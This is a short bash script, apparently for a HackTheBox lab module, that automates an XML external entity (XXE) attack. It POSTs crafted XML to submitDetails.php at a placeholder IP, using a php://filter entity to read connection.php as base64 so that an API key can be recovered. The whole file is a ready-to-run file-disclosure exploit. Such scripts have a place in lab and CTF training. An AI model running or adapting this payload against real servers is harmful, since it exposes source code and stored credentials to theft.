#!/bin/bash

# For HacktheBox module:
# Basic curl request with XML LFI and PHP filters done for HacktheBox. Easily completed with Burp, but automate everything. Decode base64 string to get API key

# Change IP
request=$(curl -s -X POST "http://<IP>/submitDetails.php" \
     -H "Content-Type: application/xml" \
     --data '<?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE email [
               <!ENTITY pwned SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
             ]>
             <root>
               <name>skript</name>
               <tel>3434343434</tel>
               <email>&pwned;</email>
               <message>Git Pwn3d Ez</message>
             </root>')
echo "$request"
